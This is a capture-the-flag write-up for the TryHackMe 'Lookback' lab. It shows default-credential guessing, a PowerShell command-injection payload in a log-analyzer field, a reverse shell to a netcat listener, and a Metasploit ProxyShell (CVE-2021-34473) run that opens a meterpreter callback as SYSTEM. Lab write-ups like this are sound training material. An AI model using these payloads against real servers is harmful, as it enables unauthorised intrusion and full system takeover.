# Lookback

## Introduction

Welcome to my another writeup! In this TryHackMe [Lookback](https://tryhackme.com/room/lookback) room, you'll learn: OS Command Injection, exploiting Microsoft Exchange (ProxyShell)! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★★★☆☆☆

## Table of Content

1. **[Service Enumeration](#service-enumeration)**
2. **[Initial Foothold](#initial-foothold)**
3. **[Privilege Escalation: admin to dev](#privilege-escalation)**
4. **[Conclusion](#conclusion)**

## Background

> You’ve been asked to run a vulnerability test on a production environment.
>  
> Difficulty: Easy

---

The Lookback company has just started the integration with Active Directory. Due to the coming deadline, the system integrator had to rush the deployment of the environment. Can you spot any vulnerabilities?  

Start the Virtual Machine by pressing the Start Machine button at the top of this task. You may access the VM using the AttackBox or your VPN connection. This machine does not respond to ping (ICMP).  

Can you find all the flags?

The VM takes about 5/10 minutes to fully boot up.

_Sometimes to move forward, we have to go backward._

_So if you get stuck, try to look back!_

## Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|13:36:54(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/https     syn-ack
|_http-favicon: Unknown favicon MD5: 9113FF8D79AB26BE6636E3541FEF9B6A
| http-title: Outlook
|_Requested resource was https://10.10.113.159/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.113.159%2fowa%2f&reason=0
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-01-25T21:34:02
| Not valid after:  2028-01-25T21:34:02
| MD5:   84e0805f3667c38fd8204e7c1da04215
| SHA-1: 08458fd9d9bfc4c648db1f82d3e7324ea92452d7
| -----BEGIN CERTIFICATE-----
| MIIDKjCCAhKgAwIBAgIQTm2IqMBJs7RKv49wp456pzANBgkqhkiG9w0BAQUFADAa
[...]
| l3WZLZr4/d/H5dnN0b/3k7CcuoFlmZjSKhnIcPQfXBEUIf5dE7pS7BaqVMooYQ==
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-16T05:44:50+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Issuer: commonName=WIN-12OUO7A66M7.thm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-25T21:12:51
| Not valid after:  2023-07-27T21:12:51
| MD5:   dce9a0190d34ca2401bdb21574409c9d
| SHA-1: d55a03f1992df334805947f990eb25be4092cbf0
| -----BEGIN CERTIFICATE-----
| MIIC9jCCAd6gAwIBAgIQVVEvN1hoxopPxcxgdQbcKzANBgkqhkiG9w0BAQsFADAk
[...]
| YCAqzbCtd181CJrW9mlBaiUX6H5yONtSxdZLFFmOsY/rnqOJarElTpQT
|_-----END CERTIFICATE-----
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
```

According to `rustscan` result, we have 3 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|80                | Microsoft IIS httpd 10.0      |
|443               | Microsoft IIS httpd 10.0      |
|3389              | Remote Desktop Protocol (RDP) |

### HTTP on Port 80

**When we go to `/`, it just responses HTTP status 403 Forbidden:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|13:46:21(HKT)]
└> curl -v http://$RHOSTS/    
*   Trying 10.10.113.159:80...
* Connected to 10.10.113.159 (10.10.113.159) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.113.159
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 403 Forbidden
< Server: Microsoft-IIS/10.0
< Date: Tue, 16 May 2023 05:47:56 GMT
< Content-Length: 0
< 
* Connection #0 to host 10.10.113.159 left intact
```

**Let's do content discovery via `gobuster`!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|13:50:57(HKT)]
└> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$RHOSTS/ -t 40 --exclude-length 0
[...]
/test                 (Status: 403) [Size: 1233]
/Test                 (Status: 403) [Size: 1233]
/TEST                 (Status: 403) [Size: 1233]
/ecp                  (Status: 302) [Size: 209] [--> https://10.10.113.159/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.113.159%2fecp&reason=0]
```

- Found hidden directory: `/test`, `/ecp`

**When we go there, it returns HTTP status 403 Forbidden again, but something different:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|13:50:25(HKT)]
└> curl -v http://$RHOSTS/test
*   Trying 10.10.113.159:80...
* Connected to 10.10.113.159 (10.10.113.159) port 80 (#0)
> GET /test HTTP/1.1
> Host: 10.10.113.159
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 403 Forbidden
< Content-Type: text/html
< Server: Microsoft-IIS/10.0
< X-Powered-By: ASP.NET
< Date: Tue, 16 May 2023 05:51:15 GMT
< Content-Length: 1233
< 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>
<title>403 - Forbidden: Access is denied.</title>
<style type="text/css">
<!--
body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}
fieldset{padding:0 15px 10px 15px;} 
h1{font-size:2.4em;margin:0;color:#FFF;}
h2{font-size:1.7em;margin:0;color:#CC0000;} 
h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} 
#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;
background-color:#555555;}
#content{margin:0 0 0 2%;position:relative;}
.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}
-->
</style>
</head>
<body>
<div id="header"><h1>Server Error</h1></div>
<div id="content">
 <div class="content-container"><fieldset>
  <h2>403 - Forbidden: Access is denied.</h2>
  <h3>You do not have permission to view this directory or page using the credentials that you supplied.</h3>
 </fieldset></div>
</div>
</body>
</html>
* Connection #0 to host 10.10.113.159 left intact
```

So we need to be authenticated.

Notice that the `Server` header indicates that the web server is using "Microsoft-IIS", which is the Windows's Active Directory's web server, and the `X-Powered-By` header is ASP.NET, which is a framework designed for web development to produce dynamic web pages.

The `/ecp` directory is redirecting us to `https://10.10.113.159/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.113.159%2fecp&reason=0`.

**Upon researching, "OWA" is "Outlook on the web":**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516140019.png)

Which means the HTTPS port is using ***Microsoft Exchange***, which is a mail server and calendaring server developed by Microsoft.

In the past years, **Microsoft Exchange has some critical zero days, often time results in Remote Code Execution (RCE).**

### HTTPS on Port 443

**When we go to `/ecp` directory on HTTP port, it directs to the Exchange admin center (EAC):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516140838.png)

In here, we need to provide the domain, username and password.

**When we to go `/`, it directs us to the regular user login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516141259.png)

**Also, we can view the SSL certificate:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Peek%202023-05-16%2014-18.gif)

In here, we can see it's Subject Alt Names (SAN)'s DNS Name': `WIN-12OUO7A66M7`, `WIN-12OUO7A66M7.thm.local`.

So the domain is `thm.local`.

## Initial Foothold

**We can add that domain to our `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|14:46:50(HKT)]
└> echo "$RHOSTS WIN-12OUO7A66M7.thm.local thm.local" | sudo tee -a /etc/hosts
```

Then, we can go deeper.

**When we go to `/test` in HTTPS port, it requires a HTTP Basic Authentication:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516145249.png)

**We can first try to guess common account, like `admin:admin`**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516145942.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516150001.png)

Oh! It worked! And we got our first flag!

After authenicated in `/test`, we can run a log analyzer with a path.

**Let's click the "Run" button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516150624.png)

**Hmm... What if we provide an invalid path?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516150701.png)

As you can see, it tried to run `Get-Content C:\<our_path>` in PowerShell!

**That being said, we can fetch any files in the system?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516151058.png)

Yes we can! So we can read arbitrary files in `/test`!

**But more importantly, we can potentialy gain RCE via OS Command Injection!!**

**After some testing, I found the following payload works:**
```powershell
BitlockerActiveMonitoringLogs'); whoami #
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516153601.png)

**The log analyzer's Powershell command should be:**
```powershell
Get-Content('C:\" & path & "')
```

To escape that, we need to:

- Add `'`, to escape the string
- Add `);` to finish the command
- Add our commands that we want to inject
- Add `#` to comment out the `'`

Nice! We got RCE now!

**Let's get a shell!**

**Set up a `nc` listener:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|14:59:09(HKT)]
└> nc -lnvp 4444                     
listening on [any] 4444 ...
```

**Send the reverse shell payload:** (Generated from [revshells.com](https://www.revshells.com/))

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516155021.png)

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|14:59:09(HKT)]
└> nc -lnvp 4444                     
listening on [any] 4444 ...
connect to [10.8.70.81] from (UNKNOWN) [10.10.113.159] 15439

PS C:\windows\system32\inetsrv> whoami;ipconfig
thm\admin

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::25cc:9c59:642e:f48c%8
   IPv4 Address. . . . . . . . . . . : 10.10.113.159
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

I'm `admin`!

**user.txt:**
```powershell
PS C:\windows\system32\inetsrv> gc C:\Users\dev\Desktop\user.txt
THM{Redacted}
```

## Privilege Escalation

### admin to dev

**Enumerate domain users:**
```powershell
PS C:\windows\system32\inetsrv> net user

User accounts for \\WIN-12OUO7A66M7

-------------------------------------------------------------------------------
$231000-O0QPBLAP47AA     Administrator            dev                      
Guest                    HealthMailbox079218d     HealthMailbox07b8995     
HealthMailbox451693b     HealthMailbox5d7068d     HealthMailbox661f7fa     
HealthMailbox7592f90     HealthMailbox82636a0     HealthMailbox878368d     
HealthMailbox8e51e05     HealthMailboxb417c9a     HealthMailboxd070f22     
krbtgt                   SM_01c36984a0954584b     SM_0bcc8f43b5d449549     
SM_77808a1914dd4685a     SM_8732593a4dab45bab     SM_9d95c1b345b24820a     
SM_ccc03880b6df44e2b     SM_de8cf2884b5344449     SM_fe3ac6e6c5c048879     
SM_fff1c36ebaee496d9     
```

In here, we can see an interesting domain user: `dev`

```powershell
PS C:\windows\system32\inetsrv> net user dev
User name                    dev
Full Name                    dev
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/12/2023 12:59:46 PM
Password expires             3/26/2023 12:59:46 PM
Password changeable          2/13/2023 12:59:46 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/21/2023 1:22:15 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Desktop Users 
Global Group memberships     *Domain Users         *Organization Manageme
```

This `dev` user in inside the "Remote Desktop Users" group, which means we could RDP to that user on port 3389.

**In that user's Desktop directory, it has a file called `TODO.txt`:**
```powershell
PS C:\windows\system32\inetsrv> gc C:\Users\dev\Desktop\TODO.txt
Hey dev team,

This is the tasks list for the deadline:

Promote Server to Domain Controller [DONE]
Setup Microsoft Exchange [DONE]
Setup IIS [DONE]
Remove the log analyzer[TO BE DONE]
Add all the users from the infra department [TO BE DONE]
Install the Security Update for MS Exchange [TO BE DONE]
Setup LAPS [TO BE DONE]


When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

Hmm... "Install the Security Update for MS Exchange".

As I've mentioned at the beginning, **Microsoft Exchange has some serious zero days in the past.**

**We can check it's version via:**
```powershell
PS C:\windows\system32\inetsrv> GCM exsetup |%{$_.Fileversioninfo}

ProductVersion   FileVersion      FileName                                                                             
--------------   -----------      --------                                                                             
15.02.0858.005   15.02.0858.005   C:\Program Files\Microsoft\Exchange Server\V15\bin\ExSetup.exe                       
```

> Microsoft Exchange Server version: 15.02.0858.005

**If you Google: "microsoft exchange 15.02.0858.005", you'll find the exact product name:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516161523.png)

> Product name: Exchange Server 2019 CU9

**In the [later version](https://support.microsoft.com/en-us/topic/description-of-the-security-update-for-microsoft-exchange-server-2019-2016-and-2013-april-13-2021-kb5001779-8e08f3b3-fc7b-466c-bbb7-5d5aa16ef064), it fixes some RCE vulnerabilities:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516161609.png)

The "[CVE-2021-34523 | Microsoft Exchange Server Elevation of Privilege Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523)" looks interesting for us, as we want to escalate our privilege.

**Then, If you Google: "CVE-2021-34523 PoC", you'll find [this GitHub repository](https://github.com/phamphuqui1998/CVE-2021-34473):** 

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Lookback/images/Pasted%20image%2020230516162120.png)

We can read through ProxyShell's writeup and the exploit script.

**After that, download the Python exploit script, and run it:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|16:22:23(HKT)]
└> python3 CVE-2021-34473.py -h
usage: CVE-2021-34473.py [-h] -u U -e E [-p P]

ProxyShell example

options:
  -h, --help  show this help message and exit
  -u U        Exchange URL
  -e E        Email address
  -p P        Local wsman port
```

In this vulnerability, it'll send an evil email to an address that you specified, and execute the reverse shell as `NT Authroity/System`.

**In user `dev`'s Desktop directory, the `TODO.txt` has an email address:** 
```
[...]
When you are done with the tasks please send an email to:

joe@thm.local
carol@thm.local
and do not forget to put in CC the infra team!
dev-infrastracture-team@thm.local
```

The `dev-infrastracture-team` sounds like the `dev` user!

However, when we run that exploit script, it's kinda weird, like getting all kinds of errors.

**Luckly, there's a working exploit in MetaSploit!**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Lookback)-[2023.05.16|16:29:20(HKT)]
└> msfconsole
[...]
msf6 > search CVE-2021-34473

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/exchange_proxyshell_rce

msf6 > use 0
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/exchange_proxyshell_rce) > set LHOST tun0
LHOST => 10.8.70.81
msf6 exploit(windows/http/exchange_proxyshell_rce) > set LPORT 4445
LPORT => 4445
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS WIN-12OUO7A66M7.thm.local
RHOSTS => WIN-12OUO7A66M7.thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > run

[*] Started reverse TCP handler on 10.8.70.81:4445 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject 'IUuj3nex0ZU' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\fUKoLOJ31rjK.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (200774 bytes) to 10.10.113.159
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\fUKoLOJ31rjK.aspx
[*] Meterpreter session 1 opened (10.8.70.81:4445 -> 10.10.113.159:18336) at 2023-05-16 16:33:59 +0800
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > 
```

Nice! We have a Meterpreter session!

**Let's spawn a shell!**
```shell
meterpreter > shell
Process 15392 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami && ipconfig
whoami && ipconfig
nt authority\system

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : eu-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::25cc:9c59:642e:f48c%8
   IPv4 Address. . . . . . . . . . . : 10.10.113.159
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.10.0.1
```

I'm `nt authority\system`!!

## Rooted

**root.txt:**
```shell
c:\windows\system32\inetsrv>type C:\Users\Administrator\Documents\flag.txt
type C:\Users\Administrator\Documents\flag.txt
THM{Redacted}
```

## Conclusion

What we've learned:

1. Enumerating Hidden Directories and Files Via `gobuster`
2. Guessing HTTP Basic Authentication Credential
3. Exploiting OS Command Injection On Windows
4. Vertical Privilege Escalation Via Exploiting Vulnerable Version Of Microsoft Exchange (ProxyShell)